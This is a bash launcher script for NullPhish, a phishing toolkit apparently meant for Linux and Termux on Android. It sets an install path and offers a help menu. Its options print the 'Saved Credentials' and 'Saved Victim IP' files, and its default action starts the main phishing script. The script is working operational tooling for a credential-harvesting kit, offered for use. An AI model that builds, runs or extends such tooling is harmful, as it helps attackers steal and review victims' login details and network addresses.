#!/usr/bin/env bash

# https://github.com/r4tur1/nullphish

if [[ $(uname -o) == *'Android'* ]];then
    NULLPHISH_ROOT="/data/data/com.termux/files/usr/opt/nullphish"
else
    export NULLPHISH_ROOT="/opt/nullphish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
    echo "To run NullPhish type \`nullphish\` in your cmd"
    echo
    echo "Help:"
    echo " -h | help : Print this menu & Exit"
    echo " -c | auth : View Saved Credentials"
    echo " -i | ip   : View Saved Victim IP"
    echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
    cat "$NULLPHISH_ROOT/auth/usernames.dat" 2> /dev/null || {
        echo "No Credentials Found !"
        exit 1
    }
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
    cat "$NULLPHISH_ROOT/auth/ip.txt" 2> /dev/null || {
        echo "No Saved IP Found !"
        exit 1
    }
else
    cd "$NULLPHISH_ROOT" || exit 1
    bash ./nullphish.sh
fi
